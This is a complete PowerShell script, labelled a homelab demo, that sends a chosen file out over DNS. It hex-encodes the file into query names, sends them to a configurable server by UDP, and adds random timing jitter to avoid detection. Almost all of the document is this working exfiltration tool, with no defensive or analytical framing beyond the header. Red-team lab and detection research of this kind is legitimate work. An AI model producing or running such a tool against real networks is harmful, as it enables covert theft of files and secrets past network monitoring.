# DNS tunneling client in pure PowerShell (no Python): sends a file as
# hex-encoded chunks in DNS query names via UdpClient. Uses only .NET BCL
# types available in stock Windows PowerShell 5.1+. Authorized homelab demo.
# Usage: .\client.ps1 -Server 127.0.0.1 -Port 5353 -File .\secret.txt [-Name out.txt] [-DelayMin 1] [-DelayMax 3]
param(
    [string]$Server = "127.0.0.1",
    [int]$Port = 5353,
    [string]$Zone = "tunnel.local",
    [Parameter(Mandatory = $true)][string]$File,
    [string]$Name = "",
    [double]$DelayMin = 0,
    [double]$DelayMax = 0
)

$Chunk = 31
$bytes = [System.IO.File]::ReadAllBytes($File)
$sha = ([System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes) | ForEach-Object { $_.ToString("x2") }) -join ""
$sess = [guid]::NewGuid().ToString("N").Substring(0, 8)
$total = [math]::Ceiling($bytes.Length / $Chunk)

if ($Name -eq "") { $Name = [System.IO.Path]::GetFileName($File) }
$Name = $Name -replace '[^A-Za-z0-9._-]', '_'
if ($Name.Length -gt 30) { $Name = $Name.Substring(0, 30) }

function To-HexStr([byte[]]$b) {
    $sb = [System.Text.StringBuilder]::new($b.Length * 2)
    foreach ($x in $b) { [void]$sb.Append($x.ToString("x2")) }
    $sb.ToString()
}

$nameHex = To-HexStr ([System.Text.Encoding]::ASCII.GetBytes($Name))
$hexData = To-HexStr $bytes

function Send-DnsQuery([string]$qname, [System.Net.Sockets.UdpClient]$udp, [System.Net.IPEndPoint]$ep) {
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        $qid = Get-Random -Minimum 0 -Maximum 65536
        $pkt = [System.Collections.Generic.List[byte]]::new()
        $pkt.Add([byte]($qid -shr 8)); $pkt.Add([byte]($qid -band 0xff))
        foreach ($v in @(0x0100, 1, 0, 0, 0)) {
            $pkt.Add([byte]($v -shr 8)); $pkt.Add([byte]($v -band 0xff))
        }
        foreach ($label in $qname.Split('.')) {
            $lb = [System.Text.Encoding]::ASCII.GetBytes($label)
            $pkt.Add([byte]$lb.Length)
            $pkt.AddRange($lb)
        }
        $pkt.Add(0)
        $pkt.Add(0); $pkt.Add(1)
        $pkt.Add(0); $pkt.Add(1)
        $udp.Send($pkt.ToArray(), $pkt.Count, $ep)
        try {
            $udp.Client.ReceiveTimeout = 1000
            $remote = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
            $null = $udp.Receive([ref]$remote)
            return
        } catch { }
    }
    throw "no response from server for $qname"
}

$udp = [System.Net.Sockets.UdpClient]::new()
$ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Parse($Server), $Port)
$suffix = "up.$Zone"

Send-DnsQuery "x.$nameHex.$($total.ToString('x4')).$sess.$suffix" $udp $ep
for ($i = 0; $i -lt $total; $i++) {
    if ($DelayMax -gt $DelayMin) {
        $ms = Get-Random -Minimum ([int]($DelayMin * 1000)) -Maximum ([int]($DelayMax * 1000) + 1)
        Start-Sleep -Milliseconds $ms
    }
    $len = [Math]::Min(62, $hexData.Length - $i * 62)
    $chunk = $hexData.Substring($i * 62, $len)
    Send-DnsQuery "h.$chunk.$($i.ToString('x4')).$sess.$suffix" $udp $ep
}
Send-DnsQuery "e.$($sha.Substring(0, 32)).$($sha.Substring(32, 32)).$sess.$suffix" $udp $ep
$udp.Close()
Write-Output "sent $File ($total chunk(s), session $sess)"
